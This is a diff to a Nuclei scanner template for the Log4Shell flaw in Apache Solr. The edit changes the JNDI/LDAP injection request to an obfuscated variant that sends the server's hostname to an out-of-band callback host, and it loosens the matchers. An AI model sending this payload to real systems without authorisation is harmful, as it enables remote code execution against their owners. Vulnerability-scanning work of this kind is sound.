@@ -22,40 +22,29 @@ info:
     max-request: 2
     verified: "true"
     shodan-query: http.html:"Apache Solr"
-  tags: vulhub,cve,solr,oast,log4j,cve2021,rce,apache,jndi,kev
-
+  tags: blind,fuzzing,rce
+  
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  
 http:
   - raw:
       - |
         @timeout: 25s
-        GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Aos.name%7D.{{interactsh-url}}%2F%7D HTTP/1.1
+        GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D HTTP/1.1
         Host: {{Hostname}}
-
+        
     attack: clusterbomb
     payloads:
       endpoint:
         - "collections"
         - "cores"
-
-    matchers-condition: and
+        
     matchers:
-      - type: word
-        part: body
-        words:
-          - 'org.apache.solr'
-
       - type: word
         part: interactsh_protocol
         words:
           - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '((W|w)(I|i)(N|n)(D|d)(O|o)(W|w)(S|s))|((L|l)(I|i)(N|n)(U|u)(X|x))\.' # Windows or Linux
-
-    extractors:
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '((W|w)(I|i)(N|n)(D|d)(O|o)(W|w)(S|s))|((L|l)(I|i)(N|n)(U|u)(X|x))\.' # Windows or Linux
+          - "http"
+        condition: or
